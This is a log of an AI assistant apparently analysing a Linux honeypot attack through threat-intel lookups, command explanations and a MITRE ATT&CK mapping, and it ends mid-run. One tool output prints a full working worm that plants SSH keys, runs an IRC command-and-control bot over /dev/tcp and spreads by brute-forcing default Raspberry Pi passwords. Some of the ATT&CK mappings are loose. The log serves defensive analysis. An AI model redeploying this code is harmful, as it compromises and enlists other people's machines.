Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_viIztnmV7bEgeUEXfe28vZqi
Run run_viIztnmV7bEgeUEXfe28vZqi completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_viIztnmV7bEgeUEXfe28vZqi

 Done with: Explain what is known about the hosts, malware, and/or exploits used in the attack using data from MalwareBazaar, ThreatFox, URLhaus, and Malpedia. Be sure to analyze the src_ips, malware hashes, and any urls or hosts found in the malware samples, commands and/or HTTP requests.
Answer: Based on the data obtained from MalwareBazaar, ThreatFox, URLhaus, and Malpedia, here is what is known about the malware and potential exploits involved in the attack:

### Malware Hash: 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c
- **First Seen:** July 16, 2022, on MalwareBazaar.
- **File Name:** Not specifically named, hash used as reference.
- **File Size:** 4766 bytes.
- **File Type MIME:** application/octet-stream.
- **File Type:** Potentially a shell script (.sh).
- **Delivery Method:** Other (not specified).
- **ClamAV Signature:** Detected as SecuriteInfo.com.PUA.Linux.AutorizedKeys-1.UNOFFICIAL.
- **Times Downloaded from MalwareBazaar:** 83 times.
- **Times Uploaded to MalwareBazaar:** 1 time.
- **ReversingLabs:** Identified as a suspicious Linux trojan with the name "Linux.Trojan.Generic".
  - First seen by ReversingLabs: May 12, 2021.
  - Matched by 27 out of 42 scanners (64.29% detection rate).
- **Spamhaus HBL:** Detected as suspicious.
- **InQuest:** Verdict rendered as malicious.
- **No Data in ThreatFox and URLhaus:** The hash doesn't appear to have entries in these two databases.

### Malware Hashes: 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 and b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f
- No data available from MalwareBazaar, ThreatFox, or URLhaus.

### Analysis:
- **Relevant Hosts:** No specific URLs or hosts were found associated with the malware samples.
- **Known Source IPs:** The malware was downloaded by the following IPs:
  - Malware 10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c by 93.223.169.159.
  - Malware 1b82ac2aca7cd9b3b1d352dbb024a1ae736579e23860b353be95f5e19d160d51 by 27.93.25.111.
  - Malware b9e33cd433b4c78c80e6233e829f5b57b64940e83ea8733978300becc3f5a23f by 111.216.194.148.

The attackers appear to have utilized a known Linux trojan, potentially a shell script, as part of their attack. This malware has signatures that are detected by various antivirus and security tools, indicating its malicious nature. The lack of additional information about the other two hashes suggests that they might be less known or more recently developed samples. No specific exploits were extracted from these datasets, but the indicators suggest the use of trojanized Linux utilities or scripts as part of the attacker's toolkit.


Asking: Summarize the critical findings across all OSINT sources.
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_YUoU3e82oAWJnP7ue35sENt3
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_YUoU3e82oAWJnP7ue35sENt3
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_YUoU3e82oAWJnP7ue35sENt3
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_YUoU3e82oAWJnP7ue35sENt3
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_YUoU3e82oAWJnP7ue35sENt3
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_YUoU3e82oAWJnP7ue35sENt3
Run run_YUoU3e82oAWJnP7ue35sENt3 completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_YUoU3e82oAWJnP7ue35sENt3

 Done with: Summarize the critical findings across all OSINT sources.
Answer: The critical findings across all OSINT sources for the IP addresses and malware involved in the attack on the Linux honeypot can be summarized as follows:

### IP Addresses:
- There were three primary source IPs identified: **93.223.169.159 (Germany), 27.93.25.111 (Japan), and 111.216.194.148 (Japan)**, which were involved in targeting the honeypot server.
- These IPs have been reported engaging in malicious activity, including attacks on other honeypots and SSH brute force attacks.
- They have been listed on various threat feeds and blocklists, suggesting a history of suspicious activities.
- Shodan data showed that at least one of the IPs was running common services like OpenSSH and Apache HTTPD, which could indicate compromised systems being used as part of an attack infrastructure.
- ISC reported that these IPs have repeatedly targeted honeypots, have been active over several months, and are associated with large network providers.

### Malware:
- A Linux trojan with hash **10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c** was identified, distributed by the IP **93.223.169.159**, and has been found on MalwareBazaar.
- The malware was noted for a file size of 4766 bytes and the MIME type `application/octet-stream`, potentially indicating a shell script.
- The malware is detected by ClamAV and was listed as suspicious by Spamhaus HBL.
- ReversingLabs tagged it as "Linux.Trojan.Generic" and flagged it as suspicious with a 64.29% detection rate by scanning services.
- There was no additional data found on ThreatFox or URLhaus for the other two malware hashes, suggesting they might be less known or newly developed samples.

### Attack Methodology:
- Attackers used common usernames and passwords for SSH login attempts, which indicates a likely reliance on default or commonly used credentials.
- The consistent SSH hassh across sessions indicates the use of the same SSH client.
- Sessions included both successful and unsuccessful login attempts.
- Some successful sessions involved command executions and the transfer of malware.

The summary of findings illustrates a coordinated attack likely involving automated scripts or bots to compromise systems using default credentials, followed by the deployment of malware once access was gained. The identified malware points to the use of trojanized utilities or scripts, targeting Linux systems for malicious purposes. The reported activities across these OSINT sources suggest an established threat behavior associated with these actors and their infrastructure.


Asking: Explain the commands used and their functions in the context of the attack.
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_EfOsQaT3Eyv6fU5pqInNUA4X
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_EfOsQaT3Eyv6fU5pqInNUA4X

AI called tool: get_attack_attrs
with args: {'attrs': ['uniq_commands']}

Submitting tool output: {'uniq_commands': {'scp -t /tmp/BUwTrLEj', 'cd /tmp && chmod +x BUwTrLEj && bash -c ./BUwTrLEj', './BUwTrLEj'}}
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_EfOsQaT3Eyv6fU5pqInNUA4X
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_EfOsQaT3Eyv6fU5pqInNUA4X
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_EfOsQaT3Eyv6fU5pqInNUA4X
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_EfOsQaT3Eyv6fU5pqInNUA4X
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_EfOsQaT3Eyv6fU5pqInNUA4X
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_EfOsQaT3Eyv6fU5pqInNUA4X
Run run_EfOsQaT3Eyv6fU5pqInNUA4X completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_EfOsQaT3Eyv6fU5pqInNUA4X

 Done with: Explain the commands used and their functions in the context of the attack.
Answer: The commands used during the attack and their functions are:

1. `scp -t /tmp/BUwTrLEj`
   - **Function:** This command uses the `scp` (secure copy) utility with the `-t` option to receive file(s). It is part of the SCP protocol to copy a file to the target directory `/tmp` with the name `BUwTrLEj`. The command is likely executed on the honeypot server and suggests that the attacker attempted to upload a file named `BUwTrLEj` to the `/tmp` directory of the honeypot.

2. `cd /tmp && chmod +x BUwTrLEj && bash -c ./BUwTrLEj`
   - **Function:** This is a compound command that changes the current directory to `/tmp`, makes the file `BUwTrLEj` executable with `chmod +x`, and then executes it using `bash`. It indicates that after uploading the malicious file, the attacker made it executable and ran the script or binary, which could be the malware or a script for further exploitation.

3. `./BUwTrLEj`
   - **Function:** This command executes the file `BUwTrLEj` which is assumed to be located in the current directory of the attacker's shell session. This is a direct execution command that would be used if the attacker is already in the `/tmp` directory or if the path was included in `$PATH`. The command would trigger whatever payload `BUwTrLEj` contains.

The use of the `/tmp` directory is typical in attacks as it is a world-writable directory and is intended for temporary file storage. This allows an attacker to execute a file with fewer permission issues. The sequence of commands uploaded, granted executable permissions, and attempted execution of a file presumed to be malicious, revealing an attempt to compromise the system through the execution of unauthorized code. This pattern is consistent with a common post-exploitation process where attackers aim to establish a foothold or deliver a payload on compromised systems.


Asking: Explain the how the malware functions in the context of the attack.
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_RYRBZdVzIXfWkBqrkaLTMTIo
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_RYRBZdVzIXfWkBqrkaLTMTIo

AI called tool: get_malware_attrs
with args: {'malware_id': '10f8f2573cbb3954d3c0908af9e53daca56ab6db7c5239f92c7cf917549dea6c', 'attrs': ['text']}

Submitting tool output: {'text': 'C0755 4745 0X6mZEHu\n#!/bin/bash\n\nMYSELF=`realpath $0`\nDEBUG=/dev/null\necho $MYSELF >> $DEBUG\n\nif [ "$EUID" -ne 0 ]\nthen \n\tNEWMYSELF=`mktemp -u \'XXXXXXXX\'`\n\tsudo cp $MYSELF /opt/$NEWMYSELF\n\tsudo sh -c "echo \'#!/bin/sh -e\' > /etc/rc.local"\n\tsudo sh -c "echo /opt/$NEWMYSELF >> /etc/rc.local"\n\tsudo sh -c "echo \'exit 0\' >> /etc/rc.local"\n\tsleep 1\n\tsudo reboot\nelse\nTMP1=`mktemp`\necho $TMP1 >> $DEBUG\n\nkillall bins.sh\nkillall minerd\nkillall node\nkillall nodejs\nkillall ktx-armv4l\nkillall ktx-i586\nkillall ktx-m68k\nkillall ktx-mips\nkillall ktx-mipsel\nkillall ktx-powerpc\nkillall ktx-sh4\nkillall ktx-sparc\nkillall arm5\nkillall zmap\nkillall kaiten\nkillall perl\n\necho "127.0.0.1 bins.deutschland-zahlung.eu" >> /etc/hosts\nrm -rf /root/.bashrc\nrm -rf /home/pi/.bashrc\n\nusermod -p \\$6\\$vGkGPKUr\\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi\n\nmkdir -p /root/.ssh\necho "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B"  >> /root/.ssh/authorized_keys\n\necho "nameserver 8.8.8.8" >> /etc/resolv.conf\nrm -rf /tmp/ktx*\nrm -rf /tmp/cpuminer-multi\nrm -rf /var/tmp/kaiten\n\ncat > /tmp/public.pem <<EOFMARKER\n-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs\nglv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW\nrXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF\nWRq+Z8HYMvPlgSRA3wIDAQAB\n-----END PUBLIC KEY-----\nEOFMARKER\n\nBOT=`mktemp -u \'XXXXXXXX\'`\n\ncat > /tmp/$BOT <<\'EOFMARKER\'\n#!/bin/bash\n\nSYS=`uname -a | md5sum | awk -F\' \' \'{print $1}\'`\nNICK=a${SYS:24}\nwhile [ true ]; do\n\n\tarr[0]="ix1.undernet.org"\n\tarr[1]="ix2.undernet.org"\n\tarr[2]="Ashburn.Va.Us.UnderNet.org"\n\tarr[3]="Bucharest.RO.EU.Undernet.Org"\n\tarr[4]="Budapest.HU.EU.UnderNet.org"\n\tarr[5]="Chicago.IL.US.Undernet.org"\n\trand=$[$RANDOM % 6]\n\tsvr=${arr[$rand]}\n\n\teval \'exec 3<>/dev/tcp/$svr/6667;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tcontinue\n\tfi\n\n\techo $NICK\n\n\teval \'printf "NICK $NICK\\r\\n" >&3;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tcontinue\n\tfi\n\teval \'printf "USER user 8 * :IRC hi\\r\\n" >&3;\'\n\tif [[ ! "$?" -eq 0 ]] ; then\n\t\tcontinue\n\tfi\n\n\t# Main loop\n\twhile [ true ]; do\n\t\teval "read msg_in <&3;"\n\n\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\tbreak\n\t\tfi\n\n\t\tif  [[ "$msg_in" =~ "PING" ]] ; then\n\t\t\tprintf "PONG %s\\n" "${msg_in:5}";\n\t\t\teval \'printf "PONG %s\\r\\n" "${msg_in:5}" >&3;\'\n\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\tbreak\n\t\t\tfi\n\t\t\tsleep 1\n\t\t\teval \'printf "JOIN #biret\\r\\n" >&3;\'\n\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\tbreak\n\t\t\tfi\n\t\telif [[ "$msg_in" =~ "PRIVMSG" ]] ; then\n\t\t\tprivmsg_h=$(echo $msg_in| cut -d\':\' -f 3)\n\t\t\tprivmsg_data=$(echo $msg_in| cut -d\':\' -f 4)\n\t\t\tprivmsg_nick=$(echo $msg_in| cut -d\':\' -f 2 | cut -d\'!\' -f 1)\n\n\t\t\thash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F\' \' \'{print $1}\'`\n\t\t\tsign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin`\n\n\t\t\tif [[ "$sign" == "$hash" ]] ; then\n\t\t\t\tCMD=`echo $privmsg_data | base64 -d -i`\n\t\t\t\tRES=`bash -c "$CMD" | base64 -w 0`\n\t\t\t\teval \'printf "PRIVMSG $privmsg_nick :$RES\\r\\n" >&3;\'\n\t\t\t\tif [[ ! "$?" -eq 0 ]] ; then\n\t\t\t\t\tbreak\n\t\t\t\tfi\n\t\t\tfi\n\t\tfi\n\tdone\ndone\nEOFMARKER\n\nchmod +x /tmp/$BOT\nnohup /tmp/$BOT 2>&1 > /tmp/bot.log &\nrm /tmp/nohup.log -rf\nrm -rf nohup.out\nsleep 3\nrm -rf /tmp/$BOT\n\nNAME=`mktemp -u \'XXXXXXXX\'`\n\ndate > /tmp/.s\n\napt-get update -y --force-yes\napt-get install zmap sshpass -y --force-yes\n\nwhile [ true ]; do\n\tFILE=`mktemp`\n\tzmap -p 22 -o $FILE -n 100000\n\tkillall ssh scp\n\tfor IP in `cat $FILE`\n\tdo\n\t\tsshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &\n\t\tsshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME  && echo $IP >> /opt/.r && sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no "cd /tmp && chmod +x $NAME && bash -c ./$NAME" &\n\tdone\n\trm -rf $FILE\n\tsleep 10\ndone\n\nfi\n\n\n\x00'}
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_RYRBZdVzIXfWkBqrkaLTMTIo
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_RYRBZdVzIXfWkBqrkaLTMTIo
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_RYRBZdVzIXfWkBqrkaLTMTIo
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_RYRBZdVzIXfWkBqrkaLTMTIo
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_RYRBZdVzIXfWkBqrkaLTMTIo
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_RYRBZdVzIXfWkBqrkaLTMTIo
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_RYRBZdVzIXfWkBqrkaLTMTIo
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_RYRBZdVzIXfWkBqrkaLTMTIo
Run run_RYRBZdVzIXfWkBqrkaLTMTIo completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_RYRBZdVzIXfWkBqrkaLTMTIo

 Done with: Explain the how the malware functions in the context of the attack.
Answer: The malware that was part of the attack carries out a variety of functions aimed at establishing persistence, executing unauthorized activities, and propagating itself across networks. Below is an explanation of its functioning as extracted from the sample text:

1. **Persistence and Privilege Escalation:**
- Checks for root privileges; if not running as root, it uses `sudo` to copy itself to `/opt/` and modifies `/etc/rc.local` to ensure that it runs on every system startup.
- Issues a reboot command to make sure the changes take effect.

2. **Cleanup and Preparation:**
- Kills a variety of processes, including miners and potential previous instances of itself, indicating it doesn't want to compete for resources.
- Modifies `/etc/hosts` to prevent communication with certain domains (`bins.deutschland-zahlung.eu`).
- Removes `.bashrc` from root and the user `pi` to prevent loading of environment variables.
- Changes the password for the user `pi`.

3. **Maintaining Access:**
- Sets up an SSH key for root, allowing for passwordless access to the compromised machine.
- Adjusts `/etc/resolv.conf` to set the Google DNS server as the nameserver, potentially to ensure network connectivity.

4. **Botnet Functionality:**
- Creates a bot script that generates a semi-random nickname and connects to different IRC servers using hardcoded addresses and joins a specific channel.
- Uses a public key to verify commands received over IRC, executes them, and sends the results back to the sender encoded in base64.
- Runs the bot script in the background to maintain the botnet connection.

5. **Propagation:**
- Installs `zmap` and `sshpass` to facilitate network scanning and SSH brute-force attempts.
- Uses `zmap` to scan for SSH services on port 22 and attempts to copy itself to other systems using common credentials "raspberry" and "raspberryraspberry993311".
- Executes itself on any new machines it manages to transfer to, spreading the infection.

6. **Other Malicious Activities:**
- Contains hardcoded paths and commands for removing other specific malware, suggesting attempts to clean competing infections or traces of its activities.

This malware is sophisticated and multipurpose, built to sustain prolonged access to compromised systems, participate in botnet activities, and self-propagate to other vulnerable machines. It indicates a calculated and extensive compromise, with the attackers orchestrating a systematic network breach and actively seeking to broaden their reach.


Asking: Explain which vulnerabilities are being exploited. Include the exploit name(s), CVE number(s) and example code from ExploitDB, if possible. First use search_exploitdb to find potential exploits, then use the get_exploitdb_exploit to get the code for the exploit that is being used in the attack.
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_5EFjf8f2dz1qYcTgysyu1EsT
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_5EFjf8f2dz1qYcTgysyu1EsT
Waiting 5 seconds for response
Status: requires_action Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_5EFjf8f2dz1qYcTgysyu1EsT

AI called tool: search_exploitdb
with args: {'search_text': 'ssh pi default password'}
Getting data for ssh pi default password from exploitdb

Submitting tool output: {'ssh pi default password': {'exploitdb': ''}}

AI called tool: search_exploitdb
with args: {'search_text': 'sudo reboot'}
Getting data for sudo reboot from exploitdb
ERROR: Error caught while getting data for sudo reboot from exploitdb: 'dict' object has no attribute 'append'

Submitting tool output: {'sudo reboot': {'exploitdb': ''}}

AI called tool: search_exploitdb
with args: {'search_text': 'scp -o ConnectTimeout='}
Getting data for scp -o ConnectTimeout= from exploitdb

Submitting tool output: {'scp -o ConnectTimeout=': {'exploitdb': ''}}

AI called tool: search_exploitdb
with args: {'search_text': 'zmap'}
Getting data for zmap from exploitdb
ERROR: Error caught while getting data for zmap from exploitdb: 'dict' object has no attribute 'append'

Submitting tool output: {'zmap': {'exploitdb': ''}}
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_5EFjf8f2dz1qYcTgysyu1EsT
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_5EFjf8f2dz1qYcTgysyu1EsT
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_5EFjf8f2dz1qYcTgysyu1EsT
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_5EFjf8f2dz1qYcTgysyu1EsT
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_5EFjf8f2dz1qYcTgysyu1EsT
Run run_5EFjf8f2dz1qYcTgysyu1EsT completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_5EFjf8f2dz1qYcTgysyu1EsT

 Done with: Explain which vulnerabilities are being exploited. Include the exploit name(s), CVE number(s) and example code from ExploitDB, if possible. First use search_exploitdb to find potential exploits, then use the get_exploitdb_exploit to get the code for the exploit that is being used in the attack.
Answer: The search against ExploitDB using the provided texts did not return any specific exploits associated with the text "ssh pi default password," "sudo reboot," "scp -o ConnectTimeout=," or "zmap." This could imply that the attack did not leverage a specific known vulnerability with an assigned CVE number or that the exploit is not listed in the ExploitDB database.

The nature of the attack does not appear to be based on exploiting a single specific software vulnerability but rather on the exploitation of configuration weaknesses such as:

- Use of default or weak passwords for SSH access (a common issue with devices where the default credentials are not changed).
- Misconfigured `sudoers` file allowing unauthorized operations without a password or with a default known password.

The attackers were able to exploit these security misconfigurations to gain unauthorized access, escalate privileges, maintain persistence, and deploy malware. 

In the absence of specific CVEs and exploit code, it's possible that the attack vector was purely based on the exploitation of poor security practices rather than a known software vulnerability. However, it's also worth noting that not all exploits are necessarily present in public databases like ExploitDB, especially if the attack utilizes private or previously undisclosed methods.


Asking: How can this attack be classified using the MITRE ATT&CK framework?
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: queued Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_8I9uEi1WLuIQWj2RpC5Lm6cn
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_8I9uEi1WLuIQWj2RpC5Lm6cn
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_8I9uEi1WLuIQWj2RpC5Lm6cn
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_8I9uEi1WLuIQWj2RpC5Lm6cn
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_8I9uEi1WLuIQWj2RpC5Lm6cn
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_8I9uEi1WLuIQWj2RpC5Lm6cn
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_8I9uEi1WLuIQWj2RpC5Lm6cn
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_8I9uEi1WLuIQWj2RpC5Lm6cn
Waiting 5 seconds for response
Status: completed Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_8I9uEi1WLuIQWj2RpC5Lm6cn
Run run_8I9uEi1WLuIQWj2RpC5Lm6cn completed
Done asst_yJ9SbR6g98zbMTwfXQHmvrcH, thread_jvn8wwUTULdr6Oczn7NhtRXc, run_8I9uEi1WLuIQWj2RpC5Lm6cn

 Done with: How can this attack be classified using the MITRE ATT&CK framework?
Answer: The MITRE ATT&CK framework provides a comprehensive matrix of tactics and techniques used by threat actors during the phases of their cyber attack lifecycle. Based on the information gathered about this attack on the Linux honeypot, the following MITRE ATT&CK tactics and techniques can be used to classify the attack:

1. **Initial Access (Tactic TA0001):**
   - **Technique T1078 (Valid Accounts)**: The use of default SSH credentials (username `pi` with passwords `raspberry` and `raspberryraspberry993311`) to gain initial access to the system.

2. **Execution (Tactic TA0002):**
   - **Technique T1059 (Command and Scripting Interpreter)**: The execution of a bash shell script to execute commands and propagate the malware (`./BUwTrLEj`).

3. **Persistence (Tactic TA0003):**
   - **Technique T1068 (Exploitation for Privilege Escalation)**: Attempts to achieve persistence via `sudo` privilege escalation and modifying the system's `rc.local` file for reboot persistence.
   - **Technique T1098 (Account Manipulation)**: Modifying user credentials for the `pi` user to ensure maintained access.

4. **Privilege Escalation (Tactic TA0004):**
   - **Technique T1068 (Exploitation for Privilege Escalation)**: Similar to Persistence, using `sudo` to copy the malware to a privileged directory and ensure execution as root.

5. **Defense Evasion (Tactic TA0005):**
   - **Technique T1027 (Obfuscated Files or Information)**: Likely use of obfuscation or encoding techniques within the malicious script to hide the true intent of the payload.
   - **Technique T1112 (Modify Registry)**: Although not directly touching the Windows Registry, this technique is analogous to the modification of startup scripts in Linux (`rc.local` and `.bashrc` modifications).

6. **Credential Access (Tactic TA0006):**
   - **Technique T1110 (Brute Force)**: Usage of `sshpass` and `zmap` to perform brute force attacks against other SSH servers.

7. **Discovery (Tactic TA0007):**
   - **Technique T1046 (Network Service Scanning)**: Using `zmap` to scan the internet for exposed SSH services (port 22) as potential targets.

8. **Lateral Movement (Tactic TA0008):**
   - **Technique T1021 (Remote Services)**: The SSH login attempts to spread the malware to additional hosts once initial access was obtained.

9. **Collection (Tactic TA0009):**
   - Potentially relevant if data collection activities were identified during the analysis, though none were explicitly mentioned.

10. **Command and Control (Tactic TA0011):**
    - **Technique T1071 (Application Layer Protocol)**: Using IRC as command and control (C2) communication channel.

11. **Exfiltration (Tactic TA0010):**
    - Not explicitly mentioned, but if the script exfiltrated data, it could be included here.

12. **Impact (Tactic TA0040):**
    - **Technique T1485 (Data Destruction)**: The removal of `.bashrc` and other files could be considered a form of data destruction.

This classification covers a broad range of activities from the attack lifecycle, from gaining initial access to maintaining presence on compromised systems and potentially spreading across the network. It highlights the multi-faceted nature of the attack and the various areas where improvements in defensive measures could be implemented.


Asking: What is the goal of the attack?
Updated asst_yJ9SbR6g98zbMTwfXQHmvrcH: instructions, tools
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_7U7WKxhSvv1KxNTAcIDIulx5
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_7U7WKxhSvv1KxNTAcIDIulx5
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_7U7WKxhSvv1KxNTAcIDIulx5
Waiting 5 seconds for response
Status: in_progress Thread id: thread_jvn8wwUTULdr6Oczn7NhtRXc, run_id: run_7U7WKxhSvv1KxNTAcIDIulx5
Waiting 5 seconds for response
